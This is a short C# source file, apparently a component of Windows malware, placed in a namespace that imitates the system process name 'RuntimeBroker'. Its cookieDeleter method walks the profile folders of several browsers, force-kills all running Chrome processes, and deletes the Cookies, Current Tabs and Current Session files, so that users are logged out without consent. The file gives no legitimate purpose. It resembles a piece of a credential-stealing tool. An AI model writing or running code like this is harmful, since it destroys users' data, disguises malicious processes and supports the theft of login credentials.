using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace RuntimeBroker
{
    public class _deleter
    {
        internal void cookieDeleter(){
            List<String> directories = new List<string>();
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Roaming\\Mozilla\\Firefox\\");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Local\\Opera\\Opera");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Roaming\\Opera\\Opera");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Local\\Apple Computer\\Safari");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Roaming\\Apple Computer\\Safari");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Intern~1");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Windows\\History");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Local\\Microsoft\\Windows\\Tempor~1");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Roaming\\Microsoft\\Windows\\Cookies");
            directories.Add(Environment.GetEnvironmentVariable("USERPROFILE") + "\\AppData\\Roaming\\Macromedia\\Flashp~1");
            foreach (var directory in directories)
            {
                if (Directory.Exists(directory))
                {
                    foreach (var process in Process.GetProcessesByName("chrome"))
                    {
                        process.Kill();
                    }
                    Thread.Sleep(1000);
                    File.Delete(String.Format("{0}\\Cookies", directory));
                    File.Delete(String.Format("{0}\\Current Tabs", directory));
                    File.Delete(String.Format("{0}\\Current Session", directory));
                }
                
            }
        }
    }
}